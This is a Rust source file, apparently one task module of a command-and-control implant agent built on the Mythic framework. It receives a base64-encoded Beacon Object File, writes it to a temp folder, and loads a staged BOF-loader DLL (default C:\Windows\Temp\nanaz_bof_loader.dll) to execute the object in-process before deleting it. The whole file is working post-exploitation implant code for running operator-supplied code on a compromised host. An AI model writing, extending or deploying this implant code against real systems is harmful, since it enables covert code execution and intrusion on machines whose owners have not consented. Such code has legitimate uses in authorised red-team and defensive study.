//! BOF (Beacon Object File) execution via a BOF-loader DLL.
//!
//! This task receives a raw COFF object file, writes it to disk, then loads
//! a **BOF-loader DLL** through the `run_dll` primitives to parse and execute
//! the BOF in-process.
//!
//! Task parameters (JSON):
//! ```json
//! {
//!     "bof_name": "whoami.o",
//!     "function": "go",
//!     "args": "<base64_raw_args>",
//!     "bof_bytes": "<base64_encoded_bof>",
//!     "loader_dll_path": "/path/to/bof_loader.dll"
//! }
//! ```
//!
//! `loader_dll_path` is optional — if omitted, it defaults to a well-known
//! location on the target (e.g. a previously-uploaded BOF loader).

use mythic::{TaskMessage, TaskResponse};
use serde::Deserialize;

// ── Params ──────────────────────────────────────────────────

#[derive(Deserialize)]
struct Params {
    /// File name used when writing the BOF to disk.
    bof_name: String,
    /// Symbol to call inside the BOF (almost always "go").
    #[serde(default = "default_function")]
    function: String,
    /// Packed arguments passed to the BOF (optional, raw bytes as base64).
    #[serde(default)]
    args: Option<String>,
    /// Base64-encoded COFF object file bytes.
    bof_bytes: String,
    /// Path to a BOF-loader DLL on the target. If omitted the command
    /// expects the loader to already be at a well-known location.
    #[serde(default)]
    loader_dll_path: Option<String>,
}

fn default_function() -> String {
    "go".into()
}

// ── BOF-loader constants ────────────────────────────────────

/// Default path where the BOF-loader DLL is expected on the target.
#[cfg(windows)]
const DEFAULT_LOADER_PATH: &str = "C:\\Windows\\Temp\\nanaz_bof_loader.dll";

#[cfg(unix)]
const DEFAULT_LOADER_PATH: &str = "/tmp/nanaz_bof_loader.so";

/// Export name inside the BOF-loader DLL that handles BOF execution.
///
/// Signature: `void bof_load_run(char *bof_path, char *function, char *args, int args_len)`
const LOADER_EXPORT: &str = "bof_load_run";

// ── Base64 helper ───────────────────────────────────────────

fn decode_b64(s: &str) -> Result<Vec<u8>, String> {
    use base64::Engine;
    base64::engine::general_purpose::STANDARD
        .decode(s.trim())
        .map_err(|e| format!("base64 decode failed: {e}"))
}

// ── Main handler ────────────────────────────────────────────

pub fn handle(task: &TaskMessage) -> TaskResponse {
    let params = match serde_json::from_str::<Params>(&task.parameters) {
        Ok(p) => p,
        Err(e) => return TaskResponse::failed(task.id, &format!("run_bof parse error: {e}")),
    };

    // 1. Decode BOF bytes
    let bof_bytes = match decode_b64(&params.bof_bytes) {
        Ok(b) => b,
        Err(e) => return TaskResponse::failed(task.id, &e),
    };

    // 2. Write BOF to temp file
    let bof_path = crate::tasks::run_dll::temp_path(&params.bof_name);
    if let Err(e) = std::fs::write(&bof_path, &bof_bytes) {
        return TaskResponse::failed(task.id, &format!("write BOF failed: {e}"));
    }
    println!("[run_bof] wrote {} bytes to {}", bof_bytes.len(), &bof_path);

    // 3. Resolve loader DLL path
    let loader_path = params
        .loader_dll_path
        .unwrap_or_else(|| DEFAULT_LOADER_PATH.to_string());

    // 4. Pack args for the BOF loader: { "bof_path":..., "function":..., "args":... }
    let loader_payload = serde_json::json!({
        "bof_path": bof_path,
        "function": params.function,
        "args": params.args,
    })
    .to_string();

    // 5. Load the BOF-loader DLL and call its export
    let result = crate::tasks::run_dll::load_and_call(
        &loader_path,
        LOADER_EXPORT,
        Some(&loader_payload),
    );

    // 6. Cleanup BOF file (best-effort)
    let _ = std::fs::remove_file(&bof_path);

    match result {
        Ok(msg) => TaskResponse {
            task_id: task.id,
            completed: Some(true),
            status: Some("completed".into()),
            user_output: Some(msg),
            ..Default::default()
        },
        Err(e) => TaskResponse::failed(task.id, &e),
    }
}
